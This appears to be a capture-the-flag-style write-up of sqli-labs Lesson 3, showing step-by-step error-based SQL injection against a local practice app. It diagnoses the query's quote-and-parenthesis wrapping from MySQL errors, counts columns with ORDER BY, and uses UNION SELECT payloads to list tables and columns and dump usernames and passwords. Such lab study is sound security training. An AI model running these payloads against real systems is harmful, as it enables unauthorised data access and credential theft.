#### 3 - ``GET - Error based - Single quote with twist - String``

```
http://localhost/sqli-labs/Less-3/
http://localhost/sqli-labs/Less-3/?id=1
```

```
http://localhost/sqli-labs/Less-3/?id=1'
```

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
```

```
''1'') LIMIT 0,1' at line 1
''1'') LIMIT 0,1'
'   '1'') LIMIT 0,1   '
'   1'   ') LIMIT 0,1
1' ')
```

```
http://localhost/sqli-labs/Less-3/?id=1\
```

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1\') LIMIT 0,1' at line 1 
```

```
''1\') LIMIT 0,1' at line 1
''1\') LIMIT 0,1'
'   '1\') LIMIT 0,1   '
'   1\   ') LIMIT 0,1
1\   ')
```

```
http://localhost/sqli-labs/Less-3/?id=1')--+
```

```
http://localhost/sqli-labs/Less-3/?id=1') order by 1--+
http://localhost/sqli-labs/Less-3/?id=1') order by 2--+
http://localhost/sqli-labs/Less-3/?id=1') order by 3--+
```

```
http://localhost/sqli-labs/Less-3/?id=-1') union select 1,2,3--+
```

```
http://localhost/sqli-labs/Less-3/?id=-1') union select 1,2,database()--+
```

```
http://localhost/sqli-labs/Less-3/?id=-1') union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where TABLE_SCHEMA=database()--+
```

```
http://localhost/sqli-labs/Less-3/?id=-1') union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='users'--+
```

```
http://localhost/sqli-labs/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users--+
```